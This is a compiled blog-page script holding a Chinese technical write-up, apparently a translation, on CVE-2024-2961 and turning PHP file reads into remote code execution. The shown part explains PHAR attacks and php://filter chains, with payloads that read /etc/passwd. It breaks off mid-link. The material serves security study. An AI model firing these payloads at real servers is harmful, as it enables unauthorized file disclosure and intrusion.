"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[5702],{8070:(e,n,c)=>{c.r(n),c.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>x,frontMatter:()=>r,metadata:()=>i,toc:()=>h});const i=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/PHP\u5229\u7528GNU-C-Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961\uff09","title":"01.PHP\u5229\u7528GNU-C-Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961\uff09","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/07.CTF/02.\u5947\u6280\u6deb\u5de7/01.PHP\u5229\u7528GNU-C-Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961\uff09.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/07.CTF/02.\u5947\u6280\u6deb\u5de7","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/PHP\u5229\u7528GNU-C-Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961\uff09","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/PHP\u5229\u7528GNU-C-Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961\uff09","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/07.CTF/02.\u5947\u6280\u6deb\u5de7/01.PHP\u5229\u7528GNU-C-Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961\uff09.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"KnownSec 2023\u5e74\u5ea6\u7b2c\u4e94\u6b21\u5185\u90e8\u653b\u9632\u6f14\u7ec3","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/Knownsec/knownsec-ctf-09/"},"next":{"title":"\u5229\u7528shell\u811a\u672c\u53d8\u91cf\u6784\u9020\u65e0\u5b57\u6bcd\u6570\u5b57\u547d\u4ee4","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/\u5229\u7528shell\u811a\u672c\u53d8\u91cf\u6784\u9020\u65e0\u5b57\u6bcd\u6570\u5b57\u547d\u4ee4"}}');var s=c(4848),d=c(8453);const r={},l="01.PHP\u5229\u7528GNU-C-Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961\uff09",o={},h=[{value:"\u4ecb\u7ecd",id:"\u4ecb\u7ecd",level:2},{value:"\u53d1\u73b0\uff1a\u4e00\u4e2a\u5173\u4e8e\u8fc7\u6ee4\u5668\u7684\u6545\u4e8b",id:"\u53d1\u73b0\u4e00\u4e2a\u5173\u4e8e\u8fc7\u6ee4\u5668\u7684\u6545\u4e8b",level:2},{value:"PHP \u4e2d\u7684\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed",id:"php-\u4e2d\u7684\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed",level:3},{value:"PHP\u8fc7\u6ee4\u5668\u7b80\u4ecb",id:"php\u8fc7\u6ee4\u5668\u7b80\u4ecb",level:3},{value:"PHP \u8fc7\u6ee4\u5668\uff1a\u524d\u7f00\u3001\u540e\u7f00\u548c crash",id:"php-\u8fc7\u6ee4\u5668\u524d\u7f00\u540e\u7f00\u548c-crash",level:3},{value:"Glibc \u4e2d\u5b58\u5728\u4e00\u4e2a\u9519\u8befCVE-2024-2961",id:"glibc-\u4e2d\u5b58\u5728\u4e00\u4e2a\u9519\u8befcve-2024-2961",level:2},{value:"The <code>iconv()</code> API",id:"the-iconv-api",level:3},{value:"\u8f6c\u6362\u4e3a ISO-2022-CN-EXT \u65f6\u51fa\u754c\u5199\u5165",id:"\u8f6c\u6362\u4e3a-iso-2022-cn-ext-\u65f6\u51fa\u754c\u5199\u5165",level:3},{value:"\u6761\u4ef6\u548c\u539f\u59cb",id:"\u6761\u4ef6\u548c\u539f\u59cb",level:3},{value:"libxml2\uff1a\u5b57\u8282\u7684\u6d77\u6d0b",id:"libxml2\u5b57\u8282\u7684\u6d77\u6d0b",level:4},{value:"pkexec\uff1a4 \u4e2a\u5b57\u8282\u592a\u591a\u4e86",id:"pkexec4-\u4e2a\u5b57\u8282\u592a\u591a\u4e86",level:4},{value:"\u6761\u4ef6\u548c\u57fa\u5143\uff08\u5df2\u66f4\u65b0\uff09",id:"\u6761\u4ef6\u548c\u57fa\u5143\u5df2\u66f4\u65b0",level:4},{value:"\u5229\u7528PHP\u8fc7\u6ee4\u5668",id:"\u5229\u7528php\u8fc7\u6ee4\u5668",level:2},{value:"PHP\u5806\u7684\u5165\u95e8",id:"php\u5806\u7684\u5165\u95e8",level:3},{value:"PHP \u8fc7\u6ee4\u5668\u5185\u90e8",id:"php-\u8fc7\u6ee4\u5668\u5185\u90e8",level:3},{value:"\u60c5\u51b5\u548c\u76ee\u6807",id:"\u60c5\u51b5\u548c\u76ee\u6807",level:3},{value:"\u5f00\u53d1",id:"\u5f00\u53d1",level:3},{value:"\u5355\u6876",id:"\u5355\u6876",level:4},{value:"\u6b63\u786e\u62c6\u89e3",id:"\u6b63\u786e\u62c6\u89e3",level:4},{value:"\u514d\u8d39\u5217\u8868\u63a7\u5236\uff1a\u5199\u4ec0\u4e48\u5c31\u5199\u4ec0\u4e48",id:"\u514d\u8d39\u5217\u8868\u63a7\u5236\u5199\u4ec0\u4e48\u5c31\u5199\u4ec0\u4e48",level:4},{value:"\u4ee3\u7801\u6267\u884c",id:"\u4ee3\u7801\u6267\u884c",level:4},{value:"\u5229\u7528\u6027\u80fd",id:"\u5229\u7528\u6027\u80fd",level:4},{value:"\u6f14\u793a",id:"\u6f14\u793a",level:4},{value:"\u51b2\u51fb",id:"\u51b2\u51fb",level:2},{value:"\u6807\u51c6\u6c34\u69fd",id:"\u6807\u51c6\u6c34\u69fd",level:3},{value:"\u4f7f\u7528\u6f0f\u6d1e",id:"\u4f7f\u7528\u6f0f\u6d1e",level:3},{value:"SQL injection to RCE SQL \u6ce8\u5165\u5230 RCE",id:"sql-injection-to-rce-sql-\u6ce8\u5165\u5230-rce",level:4},{value:"XXE",id:"xxe",level:4},{value:"\u4f5c\u4e3a PHAR \u7684\u66ff\u4ee3\u54c1",id:"\u4f5c\u4e3a-phar-\u7684\u66ff\u4ee3\u54c1",level:3},{value:"\u89e3\u6790\u5e93",id:"\u89e3\u6790\u5e93",level:3},{value:"\u7c7b\u5b9e\u4f8b\u5316",id:"\u7c7b\u5b9e\u4f8b\u5316",level:3},{value:"\u4f5c\u4e3a\u5bf9\u5c0f\u5de5\u5177\u94fe\u7684\u6539\u8fdb",id:"\u4f5c\u4e3a\u5bf9\u5c0f\u5de5\u5177\u94fe\u7684\u6539\u8fdb",level:3},{value:"\u5176\u4ed6\u4eba\uff0c\u53ef\u80fd",id:"\u5176\u4ed6\u4eba\u53ef\u80fd",level:3},{value:"\u65f6\u95f4\u7ebf",id:"\u65f6\u95f4\u7ebf",level:2},{value:"\u7ed3\u8bba",id:"\u7ed3\u8bba",level:2},{value:"\u6f0f\u6d1e\u73af\u5883",id:"\u6f0f\u6d1e\u73af\u5883",level:2},{value:"\u6f0f\u6d1e\u590d\u73b0",id:"\u6f0f\u6d1e\u590d\u73b0",level:2}];function t(e){const n={a:"a",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,d.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"01php\u5229\u7528gnu-c-iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210rcecve-2024-2961",children:"01.PHP\u5229\u7528GNU-C-Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961\uff09"})}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,s.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,s.jsx)(n.tbody,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"left"},children:(0,s.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"2025-10-15 00:52:29"})]})})]}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,s.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,s.jsx)(n.tbody,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"left"},children:(0,s.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,s.jsx)(n.td,{style:{textAlign:"left"},children:"2025-10-15 00:27:21"})]})})]}),"\n",(0,s.jsx)(n.h1,{id:"php\u5229\u7528gnu-c-iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210rcecve-2024-2961",children:"PHP\u5229\u7528GNU C Iconv\u5c06\u6587\u4ef6\u8bfb\u53d6\u53d8\u6210RCE\uff08CVE-2024-2961"}),"\n",(0,s.jsx)(n.h2,{id:"\u4ecb\u7ecd",children:"\u4ecb\u7ecd"}),"\n",(0,s.jsx)(n.p,{children:"\u51e0\u4e2a\u6708\u524d\uff0c\u6211\u5076\u7136\u5728 glibc\uff08Linux \u7a0b\u5e8f\u7684\u57fa\u7840\u5e93\uff09\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u5df2\u6709 24 \u5e74\u5386\u53f2\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\u5c3d\u7ba1\u53ef\u4ee5\u5728\u591a\u4e2a\u77e5\u540d\u5e93\u6216\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u8bbf\u95ee\uff0c\u4f46\u5b83\u88ab\u8bc1\u660e\u5f88\u5c11\u53ef\u5229\u7528\u2014\u2014\u867d\u7136\u5b83\u6ca1\u6709\u63d0\u4f9b\u592a\u591a\u7684\u56de\u65cb\u4f59\u5730\uff0c\u4f46\u5b83\u9700\u8981\u96be\u4ee5\u5b9e\u73b0\u7684\u5148\u51b3\u6761\u4ef6\u3002\u5bfb\u627e\u76ee\u6807\u4e3b\u8981\u4f1a\u5bfc\u81f4\u5931\u671b\u3002\u7136\u800c\uff0c\u5728PHP\u4e0a\uff0c\u8fd9\u4e2a\u9519\u8bef\u5927\u653e\u5f02\u5f69\uff0c\u5e76\u88ab\u8bc1\u660e\u5728\u4ee5\u4e24\u79cd\u4e0d\u540c\u7684\u65b9\u5f0f\u5229\u7528\u5176\u5f15\u64ce\u65b9\u9762\u5f88\u6709\u7528\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u7531\u4e8e\u6750\u6599\u6570\u91cf\u4f17\u591a\uff0c\u8be5\u9519\u8bef\u7684\u5f71\u54cd\u548c\u5229\u7528\u5c06\u8bb0\u5f55\u5728\u7531\u4e09\u90e8\u5206\u7ec4\u6210\u7684\u7cfb\u5217\u4e2d\u3002\u5728\u672c\u7cfb\u5217\u7684\u7b2c\u4e00\u90e8\u5206\u4e2d\uff0c\u6211\u5c06\u63cf\u8ff0\u6211\u662f\u5982\u4f55\u9047\u5230\u8fd9\u4e2a\u9519\u8bef\u7684\uff0c\u4e3a\u4ec0\u4e48\u5408\u9002\u7684\u76ee\u6807\u5f88\u5c11\u89c1\uff0c\u6700\u540e\u6df1\u5165\u7814\u7a76 PHP \u5f15\u64ce\uff0c\u6f14\u793a\u4e00\u79cd\u65b0\u7684\u5229\u7528\u5411\u91cf\uff1a\u5728 PHP \u5e94\u7528\u7a0b\u5e8f\u4e2d\u5c06\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed\u8f6c\u6362\u4e3a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u5982\u679c\u60a8\u4e0d\u719f\u6089 Web \u5f00\u53d1\u3001PHP \u6216 PHP \u5f15\u64ce\uff0c\u8bf7\u4e0d\u8981\u4ecb\u610f\uff1a\u6211\u5c06\u5728\u6b64\u8fc7\u7a0b\u4e2d\u89e3\u91ca\u76f8\u5173\u6982\u5ff5\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"\u53d1\u73b0\u4e00\u4e2a\u5173\u4e8e\u8fc7\u6ee4\u5668\u7684\u6545\u4e8b",children:"\u53d1\u73b0\uff1a\u4e00\u4e2a\u5173\u4e8e\u8fc7\u6ee4\u5668\u7684\u6545\u4e8b"}),"\n",(0,s.jsx)(n.h3,{id:"php-\u4e2d\u7684\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed",children:"PHP \u4e2d\u7684\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed"}),"\n",(0,s.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u57fa\u7840\u77e5\u8bc6\u3002\u5047\u8bbe\u5728\u6267\u884c\u8bc4\u4f30\u65f6\uff0c\u53d1\u73b0\u4e00\u4e2a\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed\uff0c\u5982\u4e0b\u6240\u793a\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"echo file_get_contents($_GET['file']);\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4f60\u80fd\u7528\u5b83\u505a\u4ec0\u4e48\uff1f\u597d\u5427\uff0c\u663e\u7136\uff0c\u8bfb\u53d6\u6587\u4ef6\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u9605\u8bfb ",(0,s.jsx)(n.code,{children:"/etc/passwd"})," \u3002\u4f46\u662f PHP \u8fd8\u5141\u8bb8\u60a8\u4f7f\u7528\u5176\u4ed6\u534f\u8bae\uff0c\u4f8b\u5982 ",(0,s.jsx)(n.code,{children:"http://"})," \u6216 ",(0,s.jsx)(n.code,{children:"ftp://"})," .\u56e0\u6b64\uff0c\u60a8\u53ef\u4ee5\u8981\u6c42 PHP \u4e3a\u60a8\u83b7\u53d6 google \u7684\u9996\u9875\uff0c\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"http://google.com"})," ;\u6216\u4ece FTP \u670d\u52a1\u5668\u4e0b\u8f7d\u6587\u4ef6\uff0c\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"ftp://user:passwd@ftp.target.com/file.bin"})," .\u4f46\u8fd9\u8fd8\u4e0d\u662f\u5168\u90e8;PHP \u8fd8\u5b9e\u73b0\u4e86\u81ea\u5b9a\u4e49\u534f\u8bae\uff0c\u4f8b\u5982 ",(0,s.jsx)(n.code,{children:"phar://"})," ."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"phar://"})," \u5141\u8bb8\u60a8\u5728 PHAR \u5b58\u6863\u4e2d\u8bfb\u53d6\u3002PHAR \u4ee3\u8868 PHP \u5b58\u6863\uff0c\u5c31\u50cf JAR \u4ee3\u8868 Java \u5b58\u6863\u4e00\u6837\u3002\u5b83\u662f\u4e00\u7ec4\u6587\u4ef6\uff0c\u4f8b\u5982\uff1a"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Source code \u6e90\u4ee3\u7801"}),"\n",(0,s.jsx)(n.li,{children:"Resources \u8d44\u6e90"}),"\n",(0,s.jsx)(n.li,{children:"Serialized metadata \u5e8f\u5217\u5316\u5143\u6570\u636e"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u591a\u5e74\u6765\uff0c\u8be5\u534f\u8bae\u4e00\u76f4\u662fPHP\u7684\u57ae\u53f0\uff0c\u56e0\u4e3a\u5f53\u60a8\u4f7f\u7528\u5b83\u8bbf\u95eePHAR\u6587\u4ef6\u65f6\uff0c\u5176\u5143\u6570\u636e\u4f1a\u88ab\u53cd\u5e8f\u5217\u5316\u3002\u901a\u5e38\u7684 PHAR \u653b\u51fb\u5982\u4e0b\u6240\u793a\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u5c06 PHAR \u5b58\u6863\u4e0a\u4f20\u5230\u76ee\u6807\u670d\u52a1\u5668\uff08PHAR \u6587\u4ef6\u975e\u5e38\u591a\u8bed\u8a00\uff0c\u56e0\u6b64\u60a8\u53ef\u4ee5\u4f7f\u5b83\u4eec\u770b\u8d77\u6765\u50cf\u56fe\u50cf\u3001PDF \u6216\u4efb\u4f55\u4e1c\u897f\uff0c\u771f\u7684\uff09"}),"\n",(0,s.jsxs)(n.li,{children:["\u4f7f\u7528\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed\u8bbf\u95ee PHAR \u6587\u4ef6\uff0c\u5e76\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"phar:///path/to/file.phar/test"})]}),"\n",(0,s.jsx)(n.li,{children:"\u4efb\u610f\u6709\u6548\u8d1f\u8f7d\u88ab\u53cd\u5e8f\u5217\u5316"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5c06\u53cd\u5e8f\u5217\u5316\u8f6c\u6362\u4e3a\u4ee3\u7801\u6267\u884c\uff0c\u4f46\u4eba\u4eec\u901a\u5e38\u4f9d\u8d56\u4e8e PHP \u4e0a\u7684\u9996\u9009\u53cd\u5e8f\u5217\u5316\u5de5\u5177 PHPGGC\u3002"}),"\n",(0,s.jsx)(n.p,{children:"PHAR \u653b\u51fb\u7684\u5f71\u54cd\u600e\u4e48\u5f3a\u8c03\u90fd\u4e0d\u4e3a\u8fc7\u3002\u81ea 2018 \u5e74\u521b\u5efa\u4ee5\u6765\uff0c\u5b83\u4eec\u4e00\u76f4\u662f\u5728 PHP \u76ee\u6807\u4e0a\u83b7\u5f97\u5916\u58f3\u7684\u5173\u952e\u3002\u4f46\u6d3e\u5bf9\u5373\u5c06\u7ed3\u675f\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["\u4ece PHP 8.0\uff082020 \u5e74\u53d1\u5e03\uff09\u5f00\u59cb\uff0c ",(0,s.jsx)(n.code,{children:"phar://"})," \u4e0d\u518d\u53cd\u5e8f\u5217\u5316\u5143\u6570\u636e\u3002\uff08\u65e0\u8bba\u5982\u4f55\uff0c\u4ed6\u4eec\u90fd\u6ca1\u6709\u4f7f\u7528\u5143\u6570\u636e\uff0c\u6240\u4ee5\u4e3a\u4ec0\u4e48\u8981\u53cd\u5e8f\u5217\u5316\u5b83\uff09\u3002\u8fd9\u5c06\u5b8c\u5168\u6740\u6b7b PHAR \u653b\u51fb\u3002"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\uff08\u5982Drupal\u6216Magento\uff09\u4e00\u76f4\u5728\u7981\u7528\u8be5\u534f\u8bae ",(0,s.jsx)(n.code,{children:"phar://"})]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsx)(n.p,{children:"\u968f\u7740\u65f6\u95f4\u7684\u6d41\u901d\uff0c\u53cd\u5e8f\u5217\u5316\u5c06\u53d8\u5f97\u8d8a\u6765\u8d8a\u96be\u4ee5\u5229\u7528\uff1a\u56fe\u4e66\u9986\u6b63\u5728\u4fee\u8865\u5176\u53cd\u5e8f\u5217\u5316\u94fe\uff0c\u800c\u6253\u5b57\u6b63\u5728\u5377\u571f\u91cd\u6765\uff0c\u4ece\u800c\u5927\u5927\u51cf\u5c11\u4e86\u53cd\u5e8f\u5217\u5316\u8def\u5f84\u3002"}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["\u4f46 ",(0,s.jsx)(n.code,{children:"phar://"})," \u5e76\u4e0d\u662f\u552f\u4e00\u5bf9\u653b\u51fb\u8005\u6709\u7528\u7684\u534f\u8bae;\u53e6\u4e00\u4e2a\u4e5f\u4ea7\u751f\u4e86\u5f88\u597d\u7684\u7ed3\u679c\uff1a ",(0,s.jsx)(n.code,{children:"php://filter"})," ."]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"php\u8fc7\u6ee4\u5668\u7b80\u4ecb",children:"PHP\u8fc7\u6ee4\u5668\u7b80\u4ecb"}),"\n",(0,s.jsxs)(n.p,{children:["\u51e0\u5e74\u6765\uff0c\u4eba\u4eec\u5bf9\u53e6\u4e00\u79cd\u7279\u5b9a\u4e8e PHP \u7684\u534f\u8bae\u4ea7\u751f\u4e86\u5174\u8da3 ",(0,s.jsx)(n.code,{children:"php://filter"})," \uff08\u5982\u679c\u540d\u79f0\u4e0d\u660e\u663e\u7684\u8bdd\uff09\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u5728\u8fd4\u56de\u6d41\u4e4b\u524d\u5c06\u8f6c\u6362\u5e94\u7528\u4e8e\u6d41\u7684\u65b9\u6cd5\u3002\u8bed\u6cd5\u4e3a\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"php://filter/[filters...]/resource=[resource]\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8d44\u6e90\u53ef\u4ee5\u662f\u6211\u4eec\u5728\u4e0a\u4e00\u8282\u4e2d\u5df2\u7ecf\u8ba8\u8bba\u8fc7\u7684\u4efb\u4f55\u5185\u5bb9\uff1a\u4e00\u4e2a\u7b80\u5355\u7684\u6587\u4ef6\u3001\u4e00\u4e2a HTTP \u54cd\u5e94\u3001\u4e00\u4e2a\u6765\u81ea FTP \u670d\u52a1\u5668\u7684\u6587\u4ef6......\n\u7b5b\u9009\u5668\u662f\u60a8\u5e0c\u671b PHP \u5e94\u7528\u4e8e\u6d41\u7684\u8f6c\u6362\u5217\u8868\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u8981\u6c42 PHP \u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"convert.base64-encode"})," \u8fc7\u6ee4\u5668\u5c06\u8d44\u6e90\u7684\u5185\u5bb9\u8f6c\u6362\u4e3a base64\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"php://filter/convert.base64-encode/resource=/etc/passwd\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5b83\u8fd4\u56de\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoCmJpbjp4OjE6MTpiaW46L2Jpbjovc2Jpbi9u\nb2xvZ2luCmRhZW1vbjp4OjI6MjpkYWVtb246L3NiaW46L3NiaW4vbm9sb2dpbgphZG06eDozOjQ6\n...\nYi92bnN0YXQ6L2Jpbi9mYWxzZQpyZWRpczp4OjEwMjoxMDM6cmVkaXM6L3Zhci9saWIvcmVkaXM6\nL2Jpbi9mYWxzZQo=\n\u60a8\u53ef\u4ee5\u6839\u636e\u9700\u8981\u6dfb\u52a0\u4efb\u610f\u6570\u91cf\u7684\u8fc7\u6ee4\u5668\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u8981\u6c42 PHP \u5bf9\u6d41\u8fdb\u884c\u4e24\u6b21 base64 \u7f16\u7801\uff1a\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u5f97\u5230\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Y205dmREcDRPakE2TURweWIyOTBPaTl5YjI5ME9pOWlhVzR2WVhOb0NtSnBianA0T2pFNk1UcGlh\n...\nRXdNam94TURNNmNtVmthWE02TDNaaGNpOXNhV0l2Y21Wa2FYTTZMMkpwYmk5bVlXeHpaUW89\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u663e\u7136\uff0cbase64 \u7f16\u7801\u5e76\u4e0d\u662f\u60a8\u552f\u4e00\u53ef\u4ee5\u505a\u7684\u4e8b\u60c5\u3002\u6709\u8bb8\u591a\u8fc7\u6ee4\u5668\u53ef\u7528\u3002\u5b83\u4eec\u5305\u62ec\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"string.upper"}),", which converts a string to uppercase\n",(0,s.jsx)(n.code,{children:"string.upper"})," \uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5927\u5199"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"string.lower"}),", which converts a string to lowercase\n",(0,s.jsx)(n.code,{children:"string.lower"})," \uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5c0f\u5199"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"string.rot13"}),", which does some BC crypto\n",(0,s.jsx)(n.code,{children:"string.rot13"})," \uff0c\u5b83\u505a\u4e86\u4e00\u4e9b BC \u52a0\u5bc6"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"convert.iconv.X.Y"}),", which converts charset from ",(0,s.jsx)(n.code,{children:"X"})," to ",(0,s.jsx)(n.code,{children:"Y"}),"\n",(0,s.jsx)(n.code,{children:"convert.iconv.X.Y"})," \uff0c\u8fd9\u4f1a\u5c06 charset \u4ece ",(0,s.jsx)(n.code,{children:"X"})," \u8f6c\u6362\u4e3a ",(0,s.jsx)(n.code,{children:"Y"})]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u6700\u540e\u4e00\u4e2a\u8fc7\u6ee4\u5668\uff1a ",(0,s.jsx)(n.code,{children:"convert.iconv.X.Y"})," .\u5047\u8bbe\u6211\u9700\u8981\u5c06\u6211\u7684\u6587\u4ef6\u4ece UTF8 \u8f6c\u6362\u4e3a UTF16\u3002\u6211\u53ef\u4ee5\u4f7f\u7528\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd\n\u5b83\u7ed9\u51fa\uff08\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\uff09\uff1a\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"00000000: fffe 7200 6f00 6f00 7400 3a00 7800 3a00  ..r.o.o.t.:.x.:.\n00000010: 3000 3a00 3000 3a00 7200 6f00 6f00 7400  0.:.0.:.r.o.o.t.\n\n                                ...\n\n00000a40: 2f00 6200 6900 6e00 2f00 6600 6100 6c00  /.b.i.n./.f.a.l.\n00000a50: 7300 6500 0a00                           s.e...\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5927\u91cf\u7684\u8fc7\u6ee4\u5668\u548c\u94fe\u63a5\u5b83\u4eec\u7684\u53ef\u80fd\u6027\u5bfc\u81f4\u4e86\u5bf9 PHP \u7684\u4e00\u4e9b\u4f1f\u5927\u7814\u7a76\uff0c\u4f8b\u5982 ",(0,s.jsx)(n.a,{href:"https://gynvael.coldwind.pl/?id=671",children:"here"}),"\u3001",(0,s.jsx)(n.a,{href:"https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d",children:"here"})," \u6216 ",(0,s.jsx)(n.a,{href:"https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py",children:"here"}),"\u3002\u4e8b\u5b9e\u4e0a\uff0c\u4f7f\u7528\u7cbe\u786e\u9009\u62e9\u7684\u8fc7\u6ee4\u5668\uff08\u8fc7\u6ee4\u5668\u94fe\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u505a\u4e00\u4e9b\u5947\u5999\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982",(0,s.jsx)(n.a,{href:"https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it",children:"\u5b8c\u5168\u66f4\u6539\u6587\u4ef6\u7684\u5185\u5bb9"}),"\uff0c\u6216\u8005\u4f7f\u7528",(0,s.jsx)(n.a,{href:"(https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle)."